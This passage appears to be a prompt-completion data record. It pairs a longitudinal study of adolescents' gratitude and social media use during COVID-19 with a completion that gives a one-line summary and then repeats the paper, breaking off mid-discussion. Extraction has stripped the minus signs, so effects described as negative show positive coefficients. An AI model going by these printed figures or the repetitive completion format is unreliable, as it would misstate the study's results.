between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents (for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"The text discusses how adolescents' gratitude and their use of social media for meaningful conversations with friends are associated over time during the COVID-19 pandemic.

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents 